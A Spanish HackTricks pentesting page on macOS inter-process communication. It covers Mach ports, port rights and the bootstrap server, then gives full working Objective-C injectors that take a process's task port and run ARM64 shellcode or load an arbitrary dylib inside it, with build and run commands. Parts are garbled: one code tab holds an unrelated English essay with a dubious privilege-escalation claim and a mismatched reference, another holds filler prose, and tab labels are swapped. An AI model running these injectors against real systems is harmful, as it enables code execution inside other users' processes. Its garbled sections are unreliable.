# IPC de macOS - Comunicación entre procesos

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Mensajería Mach a través de puertos

Mach utiliza **tareas** como la **unidad más pequeña** para compartir recursos, y cada tarea puede contener **múltiples hilos**. Estas **tareas y hilos se asignan en una relación 1:1 a procesos y hilos POSIX**.

La comunicación entre tareas se produce a través de la Comunicación entre Procesos de Mach (IPC), utilizando canales de comunicación unidireccionales. **Los mensajes se transfieren entre puertos**, que actúan como **colas de mensajes** gestionadas por el kernel.

Los derechos de puerto, que definen las operaciones que una tarea puede realizar, son clave para esta comunicación. Los posibles **derechos de puerto** son:

* **Derecho de recepción**, que permite recibir mensajes enviados al puerto. Los puertos de Mach son colas MPSC (múltiples productores, un solo consumidor), lo que significa que solo puede haber **un derecho de recepción para cada puerto** en todo el sistema (a diferencia de las tuberías, donde varios procesos pueden tener descriptores de archivo para el extremo de lectura de una tubería).
  * Una **tarea con el derecho de recepción** puede recibir mensajes y **crear derechos de envío**, lo que le permite enviar mensajes. Originalmente, solo la **propia tarea tiene el derecho de recepción sobre su puerto**.
* **Derecho de envío**, que permite enviar mensajes al puerto.
* **Derecho de envío único**, que permite enviar un mensaje al puerto y luego desaparece.
* **Derecho de conjunto de puertos**, que denota un _conjunto de puertos_ en lugar de un solo puerto. Desencolar un mensaje de un conjunto de puertos desencola un mensaje de uno de los puertos que contiene. Los conjuntos de puertos se pueden utilizar para escuchar varios puertos simultáneamente, como `select`/`poll`/`epoll`/`kqueue` en Unix.
* **Nombre muerto**, que no es un derecho de puerto real, sino simplemente un marcador de posición. Cuando se destruye un puerto, todos los derechos de puerto existentes para el puerto se convierten en nombres muertos.

**Las tareas pueden transferir derechos de ENVÍO a otros**, lo que les permite enviar mensajes de vuelta. **Los derechos de ENVÍO también se pueden clonar**, por lo que una tarea puede duplicar y dar el derecho a una tercera tarea. Esto, combinado con un proceso intermedio conocido como el **servidor de arranque**, permite una comunicación efectiva entre tareas.

#### Pasos:

Como se menciona, para establecer el canal de comunicación, está involucrado el **servidor de arranque** (**launchd** en mac).

1. La tarea **A** inicia un **nuevo puerto**, obteniendo un **derecho de RECEPCIÓN** en el proceso.
2. La tarea **A**, siendo la titular del derecho de RECEPCIÓN, **genera un derecho de ENVÍO para el puerto**.
3. La tarea **A** establece una **conexión** con el **servidor de arranque**, proporcionando el **nombre del servicio del puerto** y el **derecho de ENVÍO** a través de un procedimiento conocido como registro de arranque.
4. La tarea **B** interactúa con el **servidor de arranque** para ejecutar una **búsqueda de arranque para el nombre del servicio**. Si tiene éxito, el **servidor duplica el derecho de ENVÍO** recibido de la tarea A y **lo transmite a la tarea B**.
5. Al adquirir un derecho de ENVÍO, la tarea **B** es capaz de **formular** un **mensaje** y enviarlo **a la tarea A**.

El servidor de arranque **no puede autenticar** el nombre del servicio reclamado por una tarea. Esto significa que una **tarea** podría potencialmente **suplantar cualquier tarea del sistema**, como **falsamente reclamar un nombre de servicio de autorización** y luego aprobar cada solicitud.

Luego, Apple almacena los **nombres de los servicios proporcionados por el sistema** en archivos de configuración seguros, ubicados en directorios protegidos por SIP: `/System/Library/LaunchDaemons` y `/System/Library/LaunchAgents`. Junto a cada nombre de servicio, también se almacena el **binario asociado**. El servidor de arranque creará y mantendrá un **derecho de RECEPCIÓN para cada uno de estos nombres de servicio**.

Para estos servicios predefinidos del sistema, el **proceso de búsqueda difiere ligeramente**. Cuando se busca un nombre de servicio, launchd inicia el servicio dinámicamente. El nuevo flujo de trabajo es el siguiente:

* La tarea **B** inicia una **búsqueda de arranque** para un nombre de servicio.
* **launchd** comprueba si la tarea se está ejecutando y, si no lo está, la **inicia**.
* La tarea **A** (el servicio) realiza un **registro de arranque**. Aquí, el servidor de arranque crea un derecho de ENVÍO, lo retiene y **transfiere el derecho de RECEPCIÓN a la tarea A**.
* launchd duplica el **derecho de ENVÍO y lo envía a la tarea B**.

Sin embargo, este proceso solo se aplica a las tareas predefinidas del sistema. Las tareas que no son del sistema aún operan como se describe originalmente, lo que podría permitir la suplantación.

### Ejemplo de código

Observe cómo el **emisor** **asigna** un puerto, crea un **derecho de envío** para el nombre `org.darlinghq.example` y lo envía al **servidor de arranque** mientras que el emisor solicitó el **derecho de envío** de ese nombre y lo usó para **enviar un mensaje**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

    // Create a new port.
    mach_port_t port;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        printf("mach_port_allocate() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("mach_port_allocate() created port right name %d\n", port);


    // Give us a send right to this port, in addition to the receive right.
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        printf("mach_port_insert_right() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("mach_port_insert_right() inserted a send right\n");


    // Send the send right to the bootstrap server, so that it can be looked up by other processes.
    kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
    if (kr != KERN_SUCCESS) {
        printf("bootstrap_register() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("bootstrap_register()'ed our port\n");


    // Wait for a message.
    struct {
        mach_msg_header_t header;
        char some_text[10];
        int some_number;
        mach_msg_trailer_t trailer;
    } message;

    kr = mach_msg(
        &message.header,  // Same as (mach_msg_header_t *) &message.
        MACH_RCV_MSG,     // Options. We're receiving a message.
        0,                // Size of the message being sent, if sending.
        sizeof(message),  // Size of the buffer for receiving.
        port,             // The port to receive a message on.
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
    );
    if (kr != KERN_SUCCESS) {
        printf("mach_msg() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("Got a message\n");

    message.some_text[9] = 0;
    printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}

# IPC - Inter Process Communication

IPC is a set of methods used by processes to communicate with each other. In macOS, IPC is implemented using Mach messages. Mach messages are used to send data between processes, and they can be sent synchronously or asynchronously.

## Mach Ports

Mach ports are endpoints for Mach messages. Each Mach port has a send right and a receive right. The send right allows a process to send messages to the port, while the receive right allows a process to receive messages from the port.

Mach ports can be used for inter-process communication, as well as for synchronization between processes. For example, a process can wait for a message on a Mach port, and another process can send a message to wake it up.

## Mach Messages

Mach messages are used to send data between processes. A Mach message consists of a header and a body. The header contains information about the message, such as the size of the body and the destination port. The body contains the actual data being sent.

Mach messages can be sent synchronously or asynchronously. When a message is sent synchronously, the sending process blocks until the receiving process has received the message. When a message is sent asynchronously, the sending process continues executing immediately after sending the message.

## Mach RPC

Mach Remote Procedure Call (RPC) is a mechanism for invoking a function in a remote process. Mach RPC is implemented using Mach messages. The caller sends a Mach message to the remote process, and the remote process executes the requested function and sends a response message back to the caller.

Mach RPC can be used for inter-process communication, as well as for distributed computing. For example, a client process can invoke a function on a server process using Mach RPC.

## Mach Ports and Privilege Escalation

Mach ports can be used for privilege escalation attacks. A process can create a Mach port and give the receive right to another process. The receiving process can then send a message to the port, and the sending process will execute the message as if it came from a privileged source.

This type of attack is known as a Mach port send right vulnerability. It can be used to escalate privileges, bypass sandbox restrictions, and execute arbitrary code with elevated privileges.

## References

- [Mach IPC](https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/ipc/ipc.html)
- [Mach RPC](https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/mach_rpc/mach_rpc.html)
- [Mach Port Send Right Vulnerabilities](https://www.blackhat.com/docs/us-15/materials/us-15-Wang-A-New-Exploit-For-Rooting-Android-Devices-By-Abusing-ANRs-wp.pdf)

{% endtab %}

{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

    // Lookup the receiver port using the bootstrap server.
    mach_port_t port;
    kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
    if (kr != KERN_SUCCESS) {
        printf("bootstrap_look_up() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("bootstrap_look_up() returned port right name %d\n", port);


    // Construct our message.
    struct {
        mach_msg_header_t header;
        char some_text[10];
        int some_number;
    } message;

    message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    message.header.msgh_remote_port = port;
    message.header.msgh_local_port = MACH_PORT_NULL;

    strncpy(message.some_text, "Hello", sizeof(message.some_text));
    message.some_number = 35;

    // Send the message.
    kr = mach_msg(
        &message.header,  // Same as (mach_msg_header_t *) &message.
        MACH_SEND_MSG,    // Options. We're sending a message.
        sizeof(message),  // Size of the message being sent.
        0,                // Size of the buffer for receiving.
        MACH_PORT_NULL,   // A port to receive a message on, if receiving.
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
    );
    if (kr != KERN_SUCCESS) {
        printf("mach_msg() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Puertos privilegiados

* **Puerto de host**: Si un proceso tiene el privilegio **Enviar** sobre este puerto, puede obtener **información** sobre el **sistema** (por ejemplo, `host_processor_info`).
* **Puerto de host privado**: Un proceso con el derecho de **Enviar** sobre este puerto puede realizar **acciones privilegiadas** como cargar una extensión del kernel. El **proceso necesita ser root** para obtener este permiso.
  * Además, para llamar a la API **`kext_request`** es necesario tener la autorización **`com.apple.private.kext`**, que solo se otorga a los binarios de Apple.
* **Puerto de nombre de tarea:** Una versión no privilegiada del _puerto de tarea_. Hace referencia a la tarea, pero no permite controlarla. Lo único que parece estar disponible a través de él es `task_info()`.
* **Puerto de tarea** (también conocido como puerto de kernel)**:** Con el permiso de Enviar sobre este puerto, es posible controlar la tarea (leer/escribir memoria, crear hilos...).
  * Llame a `mach_task_self()` para **obtener el nombre** de este puerto para la tarea del llamador. Este puerto solo se **hereda** a través de **`exec()`**; una nueva tarea creada con `fork()` obtiene un nuevo puerto de tarea (como caso especial, una tarea también obtiene un nuevo puerto de tarea después de `exec()`ing un binario suid). La única forma de generar una tarea y obtener su puerto es realizar la ["danza de intercambio de puertos"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) mientras se realiza un `fork()`.
  * Estas son las restricciones para acceder al puerto (de `macos_task_policy` del binario `AppleMobileFileIntegrity`):
    * Si la aplicación tiene la autorización **`com.apple.security.get-task-allow`**, los procesos del **mismo usuario pueden acceder al puerto de tarea** (comúnmente agregado por Xcode para depurar). El proceso de **notarización** no lo permitirá en las versiones de producción.
    * Las aplicaciones con la autorización **`com.apple.system-task-ports`** pueden obtener el **puerto de tarea para cualquier** proceso, excepto el kernel. En versiones anteriores se llamaba **`task_for_pid-allow`**. Esto solo se otorga a las aplicaciones de Apple.
    * **Root puede acceder a los puertos de tarea** de aplicaciones **no** compiladas con un tiempo de ejecución **fortificado** (y no de Apple).

### Inyección de proceso de shellcode a través del puerto de tarea

Puede obtener un shellcode desde:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep
#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
        [NSThread sleepForTimeInterval:99999];
    }
    return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}

El archivo `entitlements.plist` es un archivo de propiedad que se utiliza para especificar las capacidades y permisos que una aplicación tiene en un sistema operativo macOS. Este archivo se utiliza para definir las capacidades de la aplicación, como el acceso a la red, el acceso a la cámara, el acceso a los archivos del usuario, etc. 

El archivo `entitlements.plist` se utiliza para definir las capacidades de la aplicación y se firma digitalmente para garantizar que no se modifique. Si un atacante puede modificar este archivo, puede obtener permisos adicionales en el sistema y realizar acciones maliciosas. Por lo tanto, es importante asegurarse de que este archivo esté protegido y no se pueda modificar sin autorización. 

Para verificar los permisos de una aplicación, se puede utilizar el comando `codesign` en la terminal de macOS. Este comando mostrará los permisos que se han concedido a la aplicación y si el archivo `entitlements.plist` ha sido modificado. Si se detecta una modificación, es importante investigar y solucionar el problema para evitar posibles ataques. 

En resumen, el archivo `entitlements.plist` es un archivo importante que se utiliza para definir las capacidades y permisos de una aplicación en macOS. Es importante asegurarse de que este archivo esté protegido y no se pueda modificar sin autorización para evitar posibles ataques.
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.get-task-allow</key>
    <true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Compila** el programa anterior y agrega los **entitlements** para poder inyectar código con el mismo usuario (si no, necesitarás usar **sudo**).

<details>

<summary>injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
        vm_map_t target,
        mach_vm_address_t *address,
        mach_vm_size_t size,
        int flags
);

kern_return_t mach_vm_write
(
        vm_map_t target_task,
        mach_vm_address_t address,
        vm_offset_t data,
        mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

    task_t remoteTask;

    // Get access to the task port of the process we want to inject into
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
        return (-1);
    }
    else{
        printf("Gathered privileges over the task port of process: %d\n", pid);
    }

    // Allocate memory for the stack
    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    
    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }
    else
    {

        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
    }
    
    // Allocate memory for the code
    remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }
    

    // Write the shellcode to the allocated memory
    kr = mach_vm_write(remoteTask,                   // Task port
	                   remoteCode64,                 // Virtual Address (Destination)
	                   (vm_address_t) injectedCode,  // Source
	                    0xa9);                       // Length of the source


    if (kr != KERN_SUCCESS)
    {
	fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
	return (-3);
    }


    // Set the permissions on the allocated code memory
    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

    if (kr != KERN_SUCCESS)
    {
	fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
	return (-4);
    }

    // Set the permissions on the allocated stack memory
    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
	
    if (kr != KERN_SUCCESS)
    {
	fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
	return (-4);
    }

    // Create thread to run shellcode
    struct arm_unified_thread_state remoteThreadState64;
    thread_act_t         remoteThread;

    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
        //remoteStack64 -= 8;  // need alignment of 16

    const char* p = (const char*) remoteCode64;

    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

    if (kr != KERN_SUCCESS) {
        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
        return (-3);
    }

    return (0);
}

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        if (argc < 2) {
            NSLog(@"Usage: %s <pid>", argv[0]);
            return 1;
        }

        pid_t pid = atoi(argv[1]);
        inject(pid);
    }

    return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pid-of-mysleep>
```
### Inyección de proceso Dylib a través del puerto de tarea

En macOS, los **hilos** pueden ser manipulados a través de **Mach** o utilizando la **API posix `pthread`**. El hilo que generamos en la inyección anterior fue generado utilizando la API Mach, por lo que **no es compatible con posix**.

Fue posible **inyectar un shellcode simple** para ejecutar un comando porque **no necesitaba trabajar con APIs compatibles con posix**, solo con Mach. **Inyecciones más complejas** necesitarían que el **hilo** también sea **compatible con posix**.

Por lo tanto, para **mejorar el shellcode**, debería llamar a **`pthread_create_from_mach_thread`**, lo que **creará un pthread válido**. Luego, este nuevo pthread podría **llamar a dlopen** para **cargar nuestra dylib** desde el sistema.

Puede encontrar **ejemplos de dylibs** en (por ejemplo, el que genera un registro y luego puede escucharlo):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
        vm_map_t target,
        mach_vm_address_t *address,
        mach_vm_size_t size,
        int flags
);

kern_return_t mach_vm_write
(
        vm_map_t target_task,
        mach_vm_address_t address,
        vm_offset_t data,
        mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

    "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

    // Call pthread_set_self

    "\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
    "\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
    "\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
    "\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the 
    "\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
    "\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
    "\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
    "\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
    "\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
    "\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
    "\x00\x00\x00\x14" // loop: b loop              ; loop forever

    // Call dlopen with the path to the library
    "\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
    "\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
    "\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
    "\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
    "\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()
    
    // Call pthread_exit
    "\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
    "\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
    "\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit
    
    "PTHRDCRT"  // <-
    "PTHRDEXT"  // <-
    "DLOPEN__"  // <- 
    "LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB" 
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

    task_t remoteTask;
    struct stat buf;

    // Check if the library exists
    int rc = stat (lib, &buf);

    if (rc != 0)
    {
        fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
        //return (-9);
    }

    // Get access to the task port of the process we want to inject into
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
        return (-1);
    }
    else{
        printf("Gathered privileges over the task port of process: %d\n", pid);
    }

    // Allocate memory for the stack
    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    
    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }
    else
    {

        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
    }
    
    // Allocate memory for the code
    remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }

 
    // Patch shellcode

    int i = 0;
    char *possiblePatchLocation = (injectedCode );
    for (i = 0 ; i < 0x100; i++)
    {

        // Patching is crude, but works.
        //
        extern void *_pthread_set_self;
        possiblePatchLocation++;

        
        uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
        uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
        uint64_t addrOfDlopen = (uint64_t) dlopen;

        if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
        {
            memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
            printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
        }

        if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
        {
            memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
            printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
        }

        if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
        {
            printf ("DLOpen @%llx\n", addrOfDlopen);
            memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
        }

        if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
        {
            strcpy(possiblePatchLocation, lib );
        }
    }

	// Write the shellcode to the allocated memory
    kr = mach_vm_write(remoteTask,                   // Task port
	                   remoteCode64,                 // Virtual Address (Destination)
	                   (vm_address_t) injectedCode,  // Source
	                    0xa9);                       // Length of the source


    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
        return (-3);
    }


    // Set the permissions on the allocated code memory
    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
        return (-4);
    }

    // Set the permissions on the allocated stack memory
    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
	
    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
        return (-4);
    }


    // Create thread to run shellcode
    struct arm_unified_thread_state remoteThreadState64;
    thread_act_t         remoteThread;

    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
        //remoteStack64 -= 8;  // need alignment of 16

    const char* p = (const char*) remoteCode64;

    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

    if (kr != KERN_SUCCESS) {
        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
        return (-3);
    }

    return (0);
}



int main(int argc, const char * argv[])
{
    if (argc < 3)
	{
		fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
		fprintf (stderr, "   _action_: path to a dylib on disk\n");
		exit(0);
	}

    pid_t pid = atoi(argv[1]);
    const char *action = argv[2];
    struct stat buf;

    int rc = stat (action, &buf);
    if (rc == 0) inject(pid,action);
    else
    {
        fprintf(stderr,"Dylib not found\n");
    }

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
## XPC

### Información básica

